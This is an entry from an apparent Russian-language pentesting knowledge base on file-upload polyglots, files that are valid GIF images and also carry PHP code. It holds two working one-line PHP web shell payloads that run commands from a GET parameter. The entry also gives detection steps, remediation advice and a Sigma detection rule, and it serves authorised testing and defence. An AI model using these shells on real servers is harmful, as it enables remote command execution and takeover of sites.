---
id: upload-magic-bytes-polyglot
title: "Загрузка файлов: polyglot (валидное изображение + код)"
type: upload
target: generic
category: web
difficulty: intermediate
bypass: filter
tags: [file-upload, polyglot, magic-bytes, gif]
tested_on: ["PHP + getimagesize", "ImageMagick", "браузерные декодеры"]
success_rate: 0.55
risk: high
cwe: "CWE-434"
lab: "labs/web-labs/upload-lab"
last_verified: "2026-10-23"
references:
  - "https://portswigger.net/web-security/all-topics"
graph:
  - target: "file-upload"
    type: instance_of
  - target: "rce"
    type: leads_to
  - target: "waf-bypass"
    type: technique_of
---

# Загрузка файлов: polyglot (валидное изображение + код)

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
GIF89a;
<?php system($_GET['c']); ?>
```

## Explanation

Полиглот — файл, одновременно валидный для нескольких интерпретаторов.
Простейший случай: GIF-заголовок `GIF89a` удовлетворяет `getimagesize()`
и проверкам magic bytes, а всё, что идёт дальше, PHP исполнит как код
(вне тегов `<?php ?>` интерпретатор выводит текст как есть).

Более сложные полиглоты:

- PNG/JPEG с PHP-кодом после `IEND`/в сегменте `COM`
- JPEG с кодом в EXIF-комментарии (переживает часть конвертеров)
- GIF + JS (`<script>` в метаданных, исполняется при рендере SVG/HTML)
- PDF + JS + встроенный файл
- ZIP/DOCX/SVG с XXE внутри (см. `xxe-svg-upload-vector`)
- HTML-файл с расширением `.svg` и `Content-Type: image/svg+xml`

Смысл полиглота — пройти несколько независимых проверок сразу:
расширение, MIME, magic bytes, «является ли изображением».

## Detection

1. Создайте файл `GIF89a;<?php echo 'HBMARK'; ?>` и загрузите как `.gif`/`.php.gif`.
2. Откройте его по URL — появился ли `HBMARK` (исполнение) или бинарный мусор?
3. Проверьте, пересобирается ли изображение на сервере (размер/хеш изменились?).
4. Инструменты: `polyglot`-генераторы, `GifShells`, ручной crafting.
5. В логах: загрузка файла, затем GET с параметром `?c=`/`?cmd=`.

## Remediation

- Пересборка изображения декодером (GD/Imagick/`sharp`/Pillow с `Image.verify`
  и последующим `save`) — метаданные и хвосты удаляются.
- Хранить загрузки вне веб-корня, отдавать через обработчик с принудительным
  `Content-Type` и `Content-Disposition: attachment`.
- Whitelist расширений + переименование файла (оригинальное имя не используется).
- Исполнение скриптов в каталоге загрузок отключено на уровне веб-сервера.
- Для SVG: конвертация в растр или строгая санитизация (запрет скриптов,
  внешних ссылок, `foreignObject`).
- CSP `object-src 'none'`, `X-Content-Type-Options: nosniff`.

## Variants

```
GIF89a<?php system($_GET[0]); ?>
```

```
JPEG с PHP в EXIF UserComment
```

```
PDF с /OpenAction /JS
```

## Detection rules

```yaml
title: Файл-полиглот — исполняемый код после магических байтов изображения
id: e5f6a7b8-0057-4e5f-9a7b-000000000057
status: experimental
description: >-
  Загружаемый «image/*» файл содержит PHP/JSP-код сразу после корректных
  магических байтов (GIF89a;<?php ...). Проверка только заголовка файла
  такой полиглот пропускает.
references:
  - https://attack.mitre.org/techniques/T1190/
logsource:
  category: application
  definition: 'логи загрузок/DLP с превью содержимого файла'
detection:
  upload:
    event_action: file_upload
  image_type:
    content_type|contains: 'image/'
  code_in_preview:
    file_preview|contains:
      - '<?php'
      - '<?='
      - '<%'
      - '#!/bin/sh'
      - '<jsp:'
  condition: upload and image_type and code_in_preview
fields:
  - source_ip
  - filename
  - content_type
  - file_preview
falsepositives:
  - SVG с легитимным скриптом анимации (выносите image/svg+xml в отдельное правило)
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - cwe.434
```
